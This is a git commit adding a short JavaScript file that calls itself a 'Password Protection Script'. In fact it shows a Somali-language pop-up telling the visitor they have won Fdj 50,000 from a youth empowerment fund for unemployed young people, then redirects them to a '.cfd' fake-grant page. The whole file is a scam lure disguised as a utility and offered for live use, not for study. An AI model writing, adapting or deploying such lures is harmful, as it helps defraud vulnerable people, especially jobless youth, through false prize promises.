581ba60a886187ee63cd76b1d252fd0a17ec86c1
The-ongoing <preciousadaowo4@gmail.com>
2026-04-09 18:07:07 +0100

    Create activedj.js

---
+++ activedj.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'HALKAN KA QAADO LACAG'
+password = prompt(
+  'SMS: Congratulations! Waxaa laguu qalmaa inaad hesho Fdj 50,000 MOHAMED FARAH SAMATAR SANDUUQA AWOOD-SIINTA DHALINYARADA EE DHALINYARADA SHAQO LA’AANTA AH. Fadlan riix OK si aad si degdeg ah u hesho.',
+  'HALKAN KA QAADO LACAG'
+);
+if (password != 'HALKAN KA QAADO LACAG') {
+  location.href = 'https://ongoing-grant.cfd/50000-Dhalinyaro-Deeq.html';
+  }
